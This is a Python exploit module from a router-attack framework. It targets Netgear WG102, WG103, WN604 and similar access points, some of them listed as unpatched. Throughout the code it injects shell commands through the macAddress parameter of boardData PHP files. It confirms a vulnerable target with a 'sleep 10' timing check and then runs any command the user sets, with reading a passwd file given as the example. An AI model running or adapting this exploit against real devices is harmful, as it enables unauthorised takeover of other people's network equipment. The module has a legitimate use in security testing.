# Name:Netgear WG102, WG103, WN604 and others remote code execution
# File:wg102_exec.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 21.07.2016
# Last modified: 21.07.2016
# Shodan Dork:
# Description: Command execution vulnerability for several Netgear devices listed below:
# WG102, WG103 - no fix
# WN604, WNDAP350, WNDAP360, WNAP320, WNAP210, WNDAP660, WNDAP620 - partial fix by adding authentication check
# Based on: http://firmware.re/vulns/acsa-2015-001.php

import core.Exploit
import core.io

import requests
import interface.utils
import datetime
from interface.messages import print_error, print_success, print_help, print_info, \
    print_warning


class Exploit(core.Exploit.RextExploit):
    """
Name:Netgear WG102, WG103, WN604 and others remote code execution
File:wg102_exec.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 21.07.2016
Description: Command execution vulnerability for several Netgear devices listed below:
             WG102, WG103 - no fix
             WN604, WNDAP350, WNDAP360, WNAP320, WNAP210, WNDAP660, WNDAP620 - partial fix by authentication check
Based on: http://firmware.re/vulns/acsa-2015-001.php

Options:
    Name        Description

    host        Target host address
    port        Target port
    command     Command to execute e.g. cat var/passwd
    """
    command = ""
    files = ['boardDataWW.php', 'boardDataNA.php', 'boardDataJP', 'boardData102.php', 'boardData103.php']

    def __init__(self):
        self.command = "lightttpd restart"
        core.Exploit.RextExploit.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
            elif args[0] == "port":
                if str.isdigit(args[1]):
                    self.port = args[1]
                else:
                    print_error("port value must be integer")
            elif args[0] == "command":
                self.command = ' '.join(args[1:])
        except IndexError:
            print_error("please specify value for variable")

    def do_command(self, e):
        print_info(self.command)

    def help_command(self):
        print_help("Prints current value of command")

    def do_run(self, e):
        file = ""
        for file in self.files:
            print_info("Testing file: " + file)
            url = "http://%s:%s/%s?writeData=true&reginfo=0&macAddress= 001122334455 -c 0 ;" \
                  "%s; echo #" % (self.host, self.port, file, "sleep 10")
            try:
                print_info("Doing timebased check with sleep 10")
                time_start = datetime.datetime.now()
                response = requests.get(url=url, timeout=60)
                time_end = datetime.datetime.now()
                delta = time_end - time_start
                if response.status_code == 200 and "Update Success!" in response.text:
                    if 13 > delta.seconds > 9:
                        print_success("Timebased check OK target should be vulnerable")
                    else:
                        print_warning("Timebased check failed, but target still might be vulnerable")
                    break
            except requests.Timeout:
                print_error("timeout")
            except requests.ConnectionError:
                print_error("exploit failed")
        print_success("Vulnerable file:" + file)
        print_info("Sending command")
        url = "http://%s:%s/%s?writeData=true&reginfo=0&macAddress= 001122334455 -c 0 ;" \
              "%s; echo #" % (self.host, self.port, file, self.command)
        try:
            response = requests.get(url=url, timeout=60)
            if response.status_code == 200 and "Update Success!" in response.text:
                print_success("command sent")
        except requests.Timeout:
            print_error("timeout")
        except requests.ConnectionError:
            print_error("target stopped responding or you issued reboot or killed lighttpd")
Exploit()
